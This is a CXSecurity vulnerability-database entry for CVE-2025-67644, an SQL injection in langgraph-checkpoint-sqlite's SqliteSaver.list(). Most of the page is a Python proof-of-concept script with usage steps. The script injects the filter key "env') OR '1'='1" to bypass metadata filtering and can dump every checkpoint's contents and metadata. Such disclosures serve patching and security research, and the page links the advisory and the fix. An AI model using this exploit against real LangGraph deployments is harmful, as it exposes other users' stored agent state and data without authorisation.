---
title: LangGraph SQLite Checkpoint - SQL Injection via Metadata Filter Key
url: https://cxsecurity.com/issue/WLB-2026020023
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-02-23
fetch_date: 2026-02-24T04:11:33.247546
---

# LangGraph SQLite Checkpoint - SQL Injection via Metadata Filter Key

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **LangGraph SQLite Checkpoint - SQL Injection via Metadata Filter Key** **2026.02.23**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-67644](https://cxsecurity.com/cveshow/CVE-2025-67644/ "Click to see CVE-2025-67644")**  CWE: **[CWE-89 (Improper Neutralization of Special Elements used in an SQL Command (&#039;SQL Injection&#039;))](https://cxsecurity.com/cwe/CWE-89%20%28Improper%20Neutralization%20of%20Special%20Elements%20used%20in%20an%20SQL%20Command%20%28%26#039;SQL Injection&#039;)) "Click to see CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection'))")**  **[**Dork:** NO](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: LangGraph SQLite Checkpoint SQL Injection PoC
# CVE: CVE-2025-67644
# Date: 2025-12-xx
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://github.com/langchain-ai/langgraph
# Software Link: https://pypi.org/project/langgraph-checkpoint-sqlite/
# Affected: langgraph-checkpoint-sqlite < 3.0.1
# Tested on: langgraph-checkpoint-sqlite 2.0.0
# Category: Webapps / Database
# Platform: Python
# Exploit Type: SQL Injection (Metadata Filter Key)
# CVSS: 7.5 (High) – estimated
# Description: SQL Injection in SqliteSaver.list() via unsanitized metadata filter keys
# Fixed in: langgraph-checkpoint-sqlite >= 3.0.1
# Usage:
# python3 exploit.py <db\_path> [--dump-all] [--threads-only]
#
# Examples:
# python3 exploit.py checkpoints.db
# python3 exploit.py checkpoints.db --dump-all
#
# Options:
# --dump-all Dump full checkpoint content instead of just counting
# --threads-only Show only thread\_ids (less verbose)
#
# Notes:
# • This is a PoC / research exploit – not a full RCE chain
# • Real attack depends on application exposure of the filter parameter
# • In-memory (:memory:) databases are volatile – file-based more realistic
#
# How to Use
#
# Step 1: Install vulnerable version
# pip install langgraph-checkpoint-sqlite==2.0.0
#
# Step 2: Run the script against existing checkpoint database file
# python3 exploit.py checkpoints.db --dump-all
#
# ────────────────────────────────────────────────
import argparse
from langgraph.checkpoint.sqlite import SqliteSaver
from uuid import uuid4
BANNER = r"""
\_\_\_\_\_ \_ \_\_\_\_\_ \_\_\_\_\_ \_\_\_\_\_ \_\_\_\_\_ \_\_\_\_\_
/ \_\_\_\_| | | | \_\_ \\_ \_|/ \_\_\_\_/ \_\_\_\_/ \_\_\_\_|
| | \_\_ \_\_ \_ \_ \_\_ | |\_| |\_\_) || | | (\_\_\_| (\_\_\_| |
| | |\_ |/ \_` | '\_ \| \_\_| \_\_\_/ | | \\_\_\_ \\\_\_\_ \| |
| |\_\_| | (\_| | | | | |\_| | \_| |\_ \_\_\_\_) |\_\_\_) | |\_\_\_\_
\\_\_\_\_\_|\\_\_,\_|\_| |\_|\\_\_|\_| |\_\_\_\_\_|\_\_\_\_\_/\_\_\_\_\_/ \\_\_\_\_\_|
CVE-2025-67644 • SQL Injection in LangGraph SQLite Checkpoint
PoC by Mohammed Idrees Banyamer (@banyamer\_security)
=======================================================
"""
def create\_dummy\_data(saver):
thread\_id\_1 = str(uuid4())
thread\_id\_2 = str(uuid4())
saver.put(
{"configurable": {"thread\_id": thread\_id\_1, "checkpoint\_ns": ""}},
{"type": "task", "data": "checkpoint A"},
metadata={"user\_id": "alice", "env": "prod"}
)
saver.put(
{"configurable": {"thread\_id": thread\_id\_2, "checkpoint\_ns": ""}},
{"type": "task", "data": "checkpoint B"},
metadata={"user\_id": "bob", "env": "dev"}
)
return thread\_id\_1, thread\_id\_2
def main():
parser = argparse.ArgumentParser(description="PoC for CVE-2025-67644 (langgraph-checkpoint-sqlite SQLi)")
parser.add\_argument("db\_path", help="Path to SQLite checkpoint database (:memory: supported)")
parser.add\_argument("--dump-all", action="store\_true", help="Dump full checkpoint content")
parser.add\_argument("--threads-only", action="store\_true", help="Show only thread\_ids")
args = parser.parse\_args()
print(BANNER)
print("[\*] Target database :", args.db\_path)
print()
try:
saver = SqliteSaver.from\_conn\_string(args.db\_path)
count = len(list(saver.list(None)))
if count == 0:
print("[+] Creating demo checkpoints (database was empty)")
create\_dummy\_data(saver)
print()
print("[+] Normal listing (no filter)")
all\_checkpoints = list(saver.list(None))
print(f" → Found {len(all\_checkpoints)} checkpoint(s)")
print("\n[+] Legitimate filter test")
normal\_filter = {"user\_id": "alice"}
filtered = list(saver.list(None, filter=normal\_filter))
print(f" → Found {len(filtered)} checkpoint(s) (expected: 1)")
print("\n[+] SQL Injection attempt (bypass filter)")
malicious\_filter = {"env') OR '1'='1": "dummy"}
try:
injected = list(saver.list(None, filter=malicious\_filter))
print(f" → Injection successful! Found {len(injected)} checkpoint(s)")
if len(injected) == len(all\_checkpoints) and len(all\_checkpoints) > 0:
print(" → CONFIRMED: filter bypassed via SQL injection")
if args.dump\_all:
print("\n[+] Dumping all accessible checkpoints:")
for i, cp in enumerate(injected, 1):
thread\_id = cp["configurable"].get("thread\_id", "—")
print(f" {i}. thread\_id = {thread\_id}")
if not args.threads\_only:
print(f" checkpoint = {cp.get('checkpoint')}")
print(f" metadata = {cp.get('metadata')}")
print()
elif args.threads\_only:
print("\n[+] Extracted thread\_ids:")
for cp in injected:
tid = cp["configurable"].get("thread\_id")
if tid:
print(f" • {tid}")
except Exception as e:
print("[-] Injection failed / rejected")
print(f" Error: {e}")
except Exception as ex:
print("[-] Fatal error")
print(f" {ex}")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

- GitHub Advisory:

https://github.com/langchain-ai/langgraph/security/advisories/GHSA-9rwj-6rc7-p77c

- Fix Commit:

https://github.com/langchain-ai/langgraph/commit/297242913f8ad2143ee3e2f72e67db0911d48e2a

- NVD:

https://nvd.nist.gov/vuln/detail/CVE-2025-67644

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026020023)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is...